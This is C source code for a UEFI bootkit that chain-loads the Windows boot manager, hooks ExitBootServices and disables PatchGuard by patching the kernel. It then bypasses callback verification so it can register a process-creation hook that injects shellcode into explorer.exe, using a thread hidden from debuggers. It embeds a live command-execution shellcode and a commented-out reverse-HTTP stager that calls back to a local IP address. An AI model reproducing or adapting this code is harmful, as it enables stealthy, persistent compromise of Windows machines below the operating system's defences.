#include "utils.h"

//֧��ж��
const UINT8 _gDriverUnloadImageCount = 1;
//UEFI 2.0
const UINT32 _gUefiDriverRevision = 0;
//name
CHAR8* gEfiCallerBaseName = "TestUEFIDriver";



typedef void(__stdcall* BlpArchSwitchContextfun)(int target);
BlpArchSwitchContextfun BlpArchSwitchContext;

typedef void(* pfnStartFirstUserProcess)();
pfnStartFirstUserProcess StartFirstUserProcess;

INT8 originalData[15];
INT8 newData[15];

EFI_EXIT_BOOT_SERVICES originalExitBootServices;

CHAR16 *BootmgfwDiskPath = L"\\EFI\\Microsoft\\Boot\\bootmgfw2.efi";

VOID* kernelBase = NULL;



static pfnRtlInitUnicodeString RtlInitUnicodeString = NULL;
static pfnDbgPrintEx DbgPrintEx = NULL;
static pfnMmGetSystemRoutineAddress MmGetSystemRoutineAddress;
static pfnPsGetProcessImageFileName PsGetProcessImageFileName = NULL;
static pfnKeStackAttachProcess KeStackAttachProcess = NULL;
static pfnZwAllocateVirtualMemory ZwAllocateVirtualMemory = NULL;
static pfnKeUnstackDetachProcess KeUnstackDetachProcess = NULL;
static pfnNtCreateThreadEx NtCreateThreadEx = NULL;
static pfnPsGetCurrentThread PsGetCurrentThread = NULL;
static pfnZwClose ZwClose;
static pfnPsCreateSystemThread PsCreateSystemThread = NULL;
static pfnExGetPreviousMode ExGetPreviousMode = NULL;
static pfnPsGetProcessWow64Process PsGetProcessWow64Process = NULL;
static BOOLEAN shellcodeFlag = TRUE;
static BOOLEAN explorershellcodeFlag = 0;



#define DBG 0
#if DBG 
#define KdPrintEx(_x_) DbgPrintEx _x_ 
//һ��Ҫע���л���ַ
#define ContextPrint(x, ...) \
    BlpArchSwitchContext(FirmwareContext); \
    Print(x, __VA_ARGS__); \
    BlpArchSwitchContext(ApplicationContext); \

#define DebugPrint(x,...) Print(x,__VA_ARGS__)

#else 
#define KdPrintEx(_x_)
#define ContextPrint(x, ...)
#define DebugPrint(x,...)
#endif




EFI_STATUS UtilLocateFile(IN CHAR16* ImagePath, OUT EFI_DEVICE_PATH** DevicePath)
{
	EFI_FILE_IO_INTERFACE *ioDevice;
	EFI_FILE_HANDLE handleRoots, bootFile;
	EFI_HANDLE* handleArray;
	UINTN nbHandles, i;
	EFI_STATUS efistatus;

	*DevicePath = (EFI_DEVICE_PATH *)NULL;
	efistatus = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &nbHandles, &handleArray);
	if (EFI_ERROR(efistatus))
		return efistatus;

	for (i = 0; i < nbHandles; i++)
	{
		efistatus = gBS->HandleProtocol(handleArray[i], &gEfiSimpleFileSystemProtocolGuid, (void**)&ioDevice);
		if (EFI_ERROR(efistatus))
			continue;

		efistatus = ioDevice->OpenVolume(ioDevice, &handleRoots);
		if (EFI_ERROR(efistatus))
			continue;

		efistatus = handleRoots->Open(handleRoots, &bootFile, ImagePath, EFI_FILE_MODE_READ, EFI_FILE_READ_ONLY);
		if (!EFI_ERROR(efistatus))
		{
			handleRoots->Close(bootFile);
			*DevicePath = FileDevicePath(handleArray[i], ImagePath);
			break;
		}
	}

	return efistatus;
}

VOID UtilWaitForKey(VOID)
{
	UINTN index = 0;
	EFI_INPUT_KEY key = { 0 };
	gBS->WaitForEvent(1, &gST->ConIn->WaitForKey, &index);
	gST->ConIn->ReadKeyStroke(gST->ConIn, &key);
}

__forceinline VOID* GetVirtual(VOID* physical)
{
	//ת��������ַ�������ַ
	VOID* address = physical;
	gRT->ConvertPointer(EFI_OPTIONAL_PTR, &address);
	return address;
}

VOID CopyToReadOnly(VOID* destination, VOID* source, UINTN size)
{
	_disable();
	UINT64 cr0 = __readcr0();
	UINT64 oldCr0 = cr0;
	cr0 &= ~(1UL << 16);
	__writecr0(cr0);

	CopyMemory(destination, source, size);

	__writecr0(oldCr0);

	_enable();
}

void Hook()
{
	CopyToReadOnly(StartFirstUserProcess, newData, 15);
}

void Unhook()
{
	CopyToReadOnly(StartFirstUserProcess, originalData, 15);
}



EFI_STATUS HookExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
	//OslFwpKernelSetupPhase1 call ExitBootServices
	UINT64 returnAddress = (UINT64)_ReturnAddress();
	gBS->ExitBootServices = originalExitBootServices;


	UINT64 OslExecuteTransition = FindPattern((VOID*)returnAddress, 0x4000000, "48 8B 3D ? ? ? ? 48 8B 8F ? ? ? ?");
	if (!OslExecuteTransition)
	{
		DebugPrint(L"Failed to find OslExecuteTransition!\n");
	}
	UINT64 OslLoaderBlockaddr = *(UINT64*)((OslExecuteTransition + 7) + (*(int*)(OslExecuteTransition + 3)));
	DebugPrint(L"OslLoaderBlock            -> (virt) 0x%p\n", OslLoaderBlockaddr);
	DebugPrint(L"OslExecuteTransition      -> (phys) 0x%p\n", OslExecuteTransition);

	//����BlpArchSwitchContext�������ǽ�������Ҫ���������ڴ棬��Ҫ�л�������
	BlpArchSwitchContext = (BlpArchSwitchContextfun)(FindPattern((void*)(returnAddress), 0x4000000, "40 53 48 83 EC 20 48 8B 15"));
	if (!BlpArchSwitchContext)
	{
		DebugPrint(L"Failed to find BlpArchSwitchContext!\n");
	}
	DebugPrint(L"BlpArchSwitchContext      -> (phys) 0x%p\n", BlpArchSwitchContext);
	//UtilWaitForKey();
	//�л���ַ
	BlpArchSwitchContext(ApplicationContext);
	PLOADER_PARAMETER_BLOCK loaderBlock = (PLOADER_PARAMETER_BLOCK)(OslLoaderBlockaddr);

	KLDR_DATA_TABLE_ENTRY kernelModule = GetModule(&loaderBlock->LoadOrderListHead, L"ntoskrnl.exe");
	if (!kernelModule.DllBase)
	{
		ContextPrint((L"Failed to find ntoskrnl.exe in OslLoaderBlock!\n"));
	}
	if (((PIMAGE_DOS_HEADER)(kernelModule.DllBase))->e_magic == IMAGE_DOS_SIGNATURE)
	{
		ContextPrint(L"ntoskrnl.exe              -> (virt) 0x%p\n", kernelModule.DllBase);

	}
	

	//����KeInitAmd64SpecificState
	UINT64 KeInitAmd64SpecificState = FindPatternImage(kernelModule.DllBase, "48 83 EC 28 0F AE E8 83 ? ? ? ? ? ? 0F");
	if (KeInitAmd64SpecificState && KeInitAmd64SpecificState!=2)
	{
		ContextPrint(L"KeInitAmd64SpecificState (virt) 0x%llX\n", KeInitAmd64SpecificState);

		//xor eax, eax;
		//ret;
		//�޲�PG
		*((UINT32*)KeInitAmd64SpecificState) = 0xC3C033;
		ContextPrint(L"KeInitAmd64SpecificState pg ok\n");

	}
	else
	{
		if (KeInitAmd64SpecificState==2)
		{
			ContextPrint(L"Not a PE file!\n");
		}
		else 
		{
			ContextPrint(L"Failed to find reference to KeInitAmd64SpecificState!\n");
		}
	}
	

	//StartFirstUserProcess
	UINT64 StartFirstUserProcessaddr = FindPatternImage(kernelModule.DllBase, "0F ? ? ? ? ? 8B CF E8 ? ? ? ? E8 ? ? ? ? 84 C0 0F ? ? ? ? ?");
	if (!StartFirstUserProcessaddr)
	{
		ContextPrint(L"Failed to find reference to StartFirstUserProcess!\n");
	}
	else if (StartFirstUserProcessaddr == 2)
	{
		ContextPrint(L"NO PE DOS!\n");

	}
	StartFirstUserProcessaddr += 26;
	ContextPrint(L"StartFirstUserProcessaddr (virt) 0x%llX\n", StartFirstUserProcessaddr);

	StartFirstUserProcess = (pfnStartFirstUserProcess)((StartFirstUserProcessaddr + 5) + *(int*)(StartFirstUserProcessaddr + 1));
	ContextPrint(L"StartFirstUserProcess (virt) 0x%llX\n", StartFirstUserProcess);

	kernelBase = kernelModule.DllBase;

	//�ָ�������
	BlpArchSwitchContext(FirmwareContext);

	//UtilWaitForKey();
	return originalExitBootServices(ImageHandle, MapKey);
}




PSYSTEM_SERVICE_DESCRIPTOR_TABLE GetSSDTBase()
{
	//KiSystemServiceRepeat get KeServiceDescriptorTable
	UINT64 KiSystemServiceRepeat = FindPatternImage(kernelBase, "4C 8D 15 ? ? ? ? 4C 8D 1D ? ? ? ?");
	PSYSTEM_SERVICE_DESCRIPTOR_TABLE g_SSDT = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((KiSystemServiceRepeat + 7) + *(int*)(KiSystemServiceRepeat + 3));

	return g_SSDT;
}

PVOID GetSSDTEntry(IN ULONG index)
{
	PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = GetSSDTBase();
	if (!pSSDT)
		return NULL;

	// Index range check
	if (index > pSSDT->NumberOfServices)
		return NULL;

	return (PUCHAR)pSSDT->ServiceTableBase + (((PLONG)pSSDT->ServiceTableBase)[index] >> 4);
}



KPROCESSOR_MODE PsGetCurrentThreadPreviousMode(VOID)
{
	return (KPROCESSOR_MODE)*((char*)PsGetCurrentThread()+ 0x0232);
}

VOID PsSetThreadPreviousMode(void * kThread, CHAR aPreviousMode) {
	*((char*)kThread + 0x0232) = aPreviousMode;
}



NTSTATUS NTAPI ZwCreateThreadEx(OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN UINT64 StackZeroBits, IN UINT64 SizeOfStackCommit, IN UINT64 SizeOfStackReserve, IN PNT_PROC_THREAD_ATTRIBUTE_LIST AttributeList)
{
	NTSTATUS status = 0;
	pfnNtCreateThreadEx NtCreateThreadEx;
	//ע�������NtCreateThreadExӲ����
	NtCreateThreadEx = (pfnNtCreateThreadEx)GetSSDTEntry(0xC1);
	if (NtCreateThreadEx)
	{
		//PsGetCurrentThreadPreviousMode = ExGetPreviousMode
		UCHAR prevMode = ExGetPreviousMode();//PsGetCurrentThreadPreviousMode();
		KdPrintEx((77, 0, "PreviousMode: %d", prevMode));
		PsSetThreadPreviousMode(PsGetCurrentThread(), KernelMode);

		status = NtCreateThreadEx(
			hThread, DesiredAccess, ObjectAttributes,
			ProcessHandle, lpStartAddress, lpParameter,
			Flags, StackZeroBits, SizeOfStackCommit,
			SizeOfStackReserve, AttributeList
		);
		if (!NT_SUCCESS(status))
		{
			KdPrintEx((77, 0, "NtCreateThreadEx failed! Status 0x%x\n", status));
		}
		PsSetThreadPreviousMode(PsGetCurrentThread(), prevMode);
	}
	return status;
}



NTSTATUS CreateShellcodeThread(IN PVOID BaseAddress,IN PVOID Parameter,IN ULONG Flags,IN BOOLEAN Wait)
{
	HANDLE ThreadHandle = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

	//�����߳�
	NTSTATUS Status = ZwCreateThreadEx(
		&ThreadHandle, THREAD_ALL_ACCESS, &ObjectAttributes,
		(HANDLE)-1, BaseAddress, Parameter, Flags,
		0, 0x1000, 0x100000, NULL
	);
	if (!NT_SUCCESS(Status))
	{
		KdPrintEx((77, 0, "ZwCreateThreadEx err %x",Status));
	}
	ZwClose(ThreadHandle);
	return Status;
}

NTSTATUS KernelInjectProcess(IN void* EProcess, IN PVOID pshellcode, IN UINT64 dwShellSize)
{

	UNICODE_STRING KeStackAttachProcessstr;
	RtlInitUnicodeString(&KeStackAttachProcessstr, L"KeStackAttachProcess");
	KeStackAttachProcess = (pfnKeStackAttachProcess)MmGetSystemRoutineAddress(&KeStackAttachProcessstr);

	UNICODE_STRING ZwAllocateVirtualMemorystr;
	RtlInitUnicodeString(&ZwAllocateVirtualMemorystr, L"ZwAllocateVirtualMemory");
	ZwAllocateVirtualMemory = (pfnZwAllocateVirtualMemory)MmGetSystemRoutineAddress(&ZwAllocateVirtualMemorystr);

	UNICODE_STRING KeUnstackDetachProcessstr;
	RtlInitUnicodeString(&KeUnstackDetachProcessstr, L"KeUnstackDetachProcess");
	KeUnstackDetachProcess = (pfnKeUnstackDetachProcess)MmGetSystemRoutineAddress(&KeUnstackDetachProcessstr);

	UNICODE_STRING PsGetCurrentThreadstr;
	RtlInitUnicodeString(&PsGetCurrentThreadstr, L"PsGetCurrentThread");
	PsGetCurrentThread = (pfnPsGetCurrentThread)MmGetSystemRoutineAddress(&PsGetCurrentThreadstr);

	UNICODE_STRING ZwClosestr;
	RtlInitUnicodeString(&ZwClosestr, L"ZwClose");
	ZwClose = (pfnZwClose)MmGetSystemRoutineAddress(&ZwClosestr);

	UNICODE_STRING ExGetPreviousModestr;
	RtlInitUnicodeString(&ExGetPreviousModestr, L"ExGetPreviousMode");
	ExGetPreviousMode = (pfnExGetPreviousMode)MmGetSystemRoutineAddress(&ExGetPreviousModestr);
	

	KAPC_STATE ApcState;
	NTSTATUS Status = 0;

	KeStackAttachProcess(EProcess, &ApcState);

	PVOID pBuffer = NULL;
	Status = ZwAllocateVirtualMemory((HANDLE)-1, &pBuffer, 0, &dwShellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NT_SUCCESS(Status))
	{
		memcpy(pBuffer, pshellcode, dwShellSize);
		KdPrintEx((77, 0, "��ַ��%llx ��С:%x\n", pBuffer, dwShellSize));
		//THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH | THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
		CreateShellcodeThread(pBuffer, NULL, THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH|THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, FALSE);
	}


	KeUnstackDetachProcess(&ApcState);
	return Status;
}

//������! ! NO CS Shellcode ������! !
//unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbe\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x54\x50\x41\x78\x00\x1c\x57\x06\x00\xeb\x03\x18\x22\x74\x36\x54\x1c\x59\xdc\x62\xa5\x94\xa5\xe0\x8c\x2e\x41\xa0\x87\x8c\xed\xa9\xc1\x23\x73\x39\x58\xe6\x61\x96\x60\x0f\x6d\x48\x4f\x8b\xae\x1b\x9e\x1b\xc1\x48\xd4\x78\x21\x02\x7b\x8d\xc4\x7d\x40\x18\x64\x6d\x59\x91\x84\x68\x15\xd3\xcd\xaa\x57\x4b\x3f\xd5\x3b\x26\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xad\x6f\x0d\x3a\xb5\xe5\xc8\x9d\x26\x62\xf4\xe0\xf8\xcd\x36\x2b\x9a\x68\x38\xf8\xe3\xc1\xfe\x7b\x0a\x56\x48\x7f\xe9\x10\x18\xf0\xc4\x5c\xe9\x38\xb4\x65\x52\xb4\x66\xe8\x4d\x72\x9e\xa7\x23\x95\x64\xb1\xa7\xb4\x10\xdc\xe4\xcf\x88\x5b\x11\x47\x0f\x26\x96\x11\x33\x75\xb3\xa6\x64\xde\xb7\x43\x8a\xac\xb3\xa1\x0e\x12\x95\xaf\x35\xa5\xb5\x35\xee\x5e\xc9\xe9\x38\x65\x10\x84\x6e\x73\xae\x3e\x78\x63\x01\x49\x7c\x9f\x46\xcf\x60\x12\x31\x10\xc1\x5d\xc5\xea\xa2\xc2\x5a\xba\x0d\x7f\x0d\x78\x16\x8d\xa0\xdc\x72\x06\xce\xab\x34\xb3\x01\x58\x3e\xbe\x78\x3a\xbc\xc5\x4a\x5e\x70\x87\xc5\xcd\x96\x79\x9f\xf9\xa9\x42\x71\x99\x1f\x56\x4c\x32\xe9\x76\x0f\xb2\x9d\xeb\xb2\x61\xe0\xc6\x08\xfe\x3b\xf2\x98\x93\x7f\x4b\xf2\x0d\xe0\x28\xbb\x5e\x64\x53\x4d\x71\x32\x2d\x17\x0e\xc0\x07\x95\x7a\x3d\xbe\x89\x37\x96\x99\xe4\x73\xd6\x5a\x5b\xe7\x0e\xb1\x64\x01\x33\x48\x40\x03\x29\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x33\x35\x00\x49\x96\x02\xd2";

//exec cmd shellcode

unsigned char shellcode[98] = {
	0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x6D, 0x64, 0x00,
	0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76,
	0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B,
	0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F,
	0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
	0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75,
	0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48,
	0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x68, 0x5D, 0x5F, 0x5E,
	0x5B, 0xC3
};




void PcreateProcessNotifyRoutineEx(
	void* Process,
	HANDLE ProcessId,
	PPS_CREATE_NOTIFY_INFO CreateInfo
)
{
	KdPrintEx((77, 0, "PcreateProcessNotifyRoutineEx Start\n"));

	char* pszImageFileName = PsGetProcessImageFileName(Process);

	if (CreateInfo != NULL)
	{
		//shellcodeFlag 
		if (shellcodeFlag)
		{
			
			if (strcmp(pszImageFileName, "explorer.exe") == 0)
			{
				if (PsGetProcessWow64Process(Process) == NULL) {
					//1.���õ�����ȥα�� ,2.shellcode get
					KernelInjectProcess(Process, shellcode, sizeof shellcode);
					//explorershellcodeFlag .....
					explorershellcodeFlag = 1;
					KdPrintEx((77, 0, "explorerע�����\n"));
				}

			}
		}

		KdPrintEx((77, 0, "[%s][%d][%wZ]\n", pszImageFileName, ProcessId, CreateInfo->ImageFileName));
	}

}

void KernelMainThread(PVOID ParameterData)
{

	MmGetSystemRoutineAddress = (pfnMmGetSystemRoutineAddress)GetExport(kernelBase, "MmGetSystemRoutineAddress");
	
	//����ʹ��GetExport
	UNICODE_STRING PsSetCreateProcessNotifyRoutineExstr;
	RtlInitUnicodeString(&PsSetCreateProcessNotifyRoutineExstr, L"PsSetCreateProcessNotifyRoutineEx");
	pfnPsSetCreateProcessNotifyRoutineEx PsSetCreateProcessNotifyRoutineEx = (pfnPsSetCreateProcessNotifyRoutineEx)MmGetSystemRoutineAddress(&PsSetCreateProcessNotifyRoutineExstr);
	
	UNICODE_STRING PsGetProcessWow64Processstr;
	RtlInitUnicodeString(&PsGetProcessWow64Processstr, L"PsGetProcessWow64Process");
	PsGetProcessWow64Process = (pfnPsGetProcessWow64Process)MmGetSystemRoutineAddress(&PsGetProcessWow64Processstr);



	//�޲�MmVerifyCallbackFunctionCheckFlags ���Ǵ���BootLoaded Memory
	UINT64 MmVerifyCallbackFunctionCheckFlagsaddr = FindPatternImage(kernelBase, "BA 20 00 00 00 E8 ? ? ? ? 85 C0");

	MmVerifyCallbackFunctionCheckFlagsaddr += 5;
	UINT64 MmVerifyCallbackFunctionCheckFlags = (MmVerifyCallbackFunctionCheckFlagsaddr + 5) + *(int*)(MmVerifyCallbackFunctionCheckFlagsaddr + 1);

	UINT8 MmVerifyCallbackFunctionCheckFlagsPatch[] = { 0xb8,0x01,0x00,0x00,0x00,0xc3 };
	UINT8 MmVerifyCallbackFunctionCheckFlagsOriginal[5];

	//����ԭʼ����
	CopyToReadOnly((void*)MmVerifyCallbackFunctionCheckFlagsOriginal, (void*)MmVerifyCallbackFunctionCheckFlags, 6);

	//�޲�
	CopyToReadOnly((void*)MmVerifyCallbackFunctionCheckFlags, (void*)MmVerifyCallbackFunctionCheckFlagsPatch, 6);


	DWORD status = PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, FALSE);
	if (!NT_SUCCESS(status)) {
		KdPrintEx((77, 0, "PsSetCreateProcessNotifyRoutineEx2 failed! Status 0x%x\n", status));
	}

	//�ָ�
	CopyToReadOnly((void*)MmVerifyCallbackFunctionCheckFlags, (void*)MmVerifyCallbackFunctionCheckFlagsOriginal, 6);



}

void StartFirstUserProcessHook() {

	Unhook();
	
	//��ȡ����
	DbgPrintEx = (pfnDbgPrintEx)GetExport(kernelBase, "DbgPrintEx");
	RtlInitUnicodeString = (pfnRtlInitUnicodeString)GetExport(kernelBase, "RtlInitUnicodeString");
	PsGetProcessImageFileName = (pfnPsGetProcessImageFileName)GetExport(kernelBase, "PsGetProcessImageFileName");
	PsCreateSystemThread = (pfnPsCreateSystemThread)GetExport(kernelBase, "PsCreateSystemThread");
	if (!DbgPrintEx&&!RtlInitUnicodeString&&!PsGetProcessImageFileName&&!PsCreateSystemThread)
	{
		KdPrintEx((77, 0, "DbgPrintEx or RtlInitUnicodeString or PsGetProcessImageFileName or PsCreateSystemThread"));
	}


	KdPrintEx((77, 0, "StartFirstUserProcess HOOK Fun Start\n"));

	HANDLE   ThreadHandle = NULL;
	NTSTATUS Status = 0;

	//����һ���ں��߳�
	Status = PsCreateSystemThread(
		&ThreadHandle,
		0,
		NULL,
		NULL,					//����system�߳�
		NULL,
		(void*)KernelMainThread,
		NULL);
	StartFirstUserProcess();

	//Hook();

}

EFI_EVENT virtualEvent = NULL;
VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
	//��ʱExitBootServices�ѱ�����gBS���������ʹ��
	//����ԭʼ����
	CopyMemory(originalData, StartFirstUserProcess,15);

	//xor eax,eax
	//mov rax,funaddr
	//jmp rax
	UINT8 jump[] = { 0x48, 0x31, 0xc0, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
	//Get StartFirstUserProcessHook virt
	*(UINT64*)(((UINT64)jump) + 5) = (UINT64)GetVirtual(StartFirstUserProcessHook);
	CopyMemory(newData, jump, 15);
	Hook();
}


EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
	EFI_STATUS status;
	//CalculateCrc32
	originalExitBootServices = gBS->ExitBootServices;
	gBS->ExitBootServices = HookExitBootServices;

	//ע���¼��ص�����os loader ����SetVirtualAddressMapʱ֪ͨ����
	//����Edk2�ĵ�����ѡ��CreateEventEx���gEfiEventVirtualAddressChangeGuid��EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE
	//SetVirtualAddressMapEvent
	status = gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &virtualEvent);
	if (status != EFI_SUCCESS)
	{
		DebugPrint(L"CreateEvent err");
	}

	EFI_DEVICE_PATH* BootmgfwPath;
	EFI_HANDLE BootmgfwImageHandle;
	//ת��·��
	UtilLocateFile(BootmgfwDiskPath, &BootmgfwPath);
	//����bootmgfw.efi
	status = gBS->LoadImage(TRUE, ImageHandle, BootmgfwPath, NULL, 0, &BootmgfwImageHandle);
	if (status != EFI_SUCCESS)
	{
		DebugPrint(L"LoadImage No bootmgfw.efi");
	}
	//����
	status = gBS->StartImage(BootmgfwImageHandle, 0, 0);

	return status;

}

EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE ImageHandle)
{

	return EFI_ACCESS_DENIED;
}